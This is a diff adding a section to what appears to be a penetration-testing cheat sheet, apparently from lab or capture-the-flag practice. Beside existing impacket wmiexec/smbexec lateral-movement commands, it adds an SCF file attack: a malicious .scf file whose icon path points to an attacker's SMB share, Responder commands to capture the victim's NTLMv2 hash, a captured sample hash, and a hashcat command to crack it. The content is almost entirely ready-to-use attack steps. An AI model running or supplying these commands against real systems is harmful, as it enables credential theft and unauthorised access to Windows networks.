@@ -40,3 +40,22 @@ wmiexec.py marvel.local/username:password@<ip>
 # Using smbexec.py (this is quieter than psexec.py)
 smbexec.py marvel.local/username:password@<ip>
 ```
+
+#### SCF file attacks using SMB
+```
+# Create @exploit.scf file with following
+[Shell]
+Command=2
+IconFile=\\<attackingip>\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+
+# Start responder on your attacking machine
+responder -wrf --lm -v -I tun0
+
+# Upload the @exploit.scf to the server and wait for responder to capture the NTLMv2 hash.
+[SMB] NTLMv2 Hash     : tony::DRIVER:79d968a4f5cee962:C821932E31C78D0AD6229C9B3718709F:01010000000000003FD7E71A9D2BD8015CA798B5DEABF44800000000020000000000000000000000
+
+# Copy that hash into a hash.txt file and use hashcat to crack it
+hashcat -a 0 -m 5600 hash.txt rockyou.txt -O
+```
